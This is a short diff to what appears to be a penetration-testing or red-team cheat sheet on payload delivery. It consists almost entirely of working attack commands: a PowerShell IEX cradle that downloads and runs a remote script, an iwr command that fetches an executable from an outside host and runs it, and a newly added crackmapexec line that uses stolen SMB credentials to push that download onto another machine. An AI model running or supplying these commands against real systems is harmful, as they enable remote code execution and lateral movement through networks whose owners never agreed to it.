@@ -101,8 +101,9 @@ MSBuild Beacon
   Powershell IEX
     "powershell iex (new-object net.webclient).downloadstring('http://10.10.10.10/update')"
     Upload exe and execute
-    iwr -uri http://10.10.5.13/myfile -outfile c:\windows\temp\test.exe
-    c:\windows\temp\test.exe
+        iwr -uri http://10.10.5.13/myfile -outfile c:\windows\temp\test.exe
+        crackmapexec smb 10.10.5.30 -u username -p password -X 'powershell.exe -version 3 iwr -uri http://10.10.5.13/myfile -outfile c:\windows\temp\test.exe'
+        c:\windows\temp\test.exe
     
   MSBuild NPS 
     Genereate XML using script from https://github.com/trustedsec/nps_payload
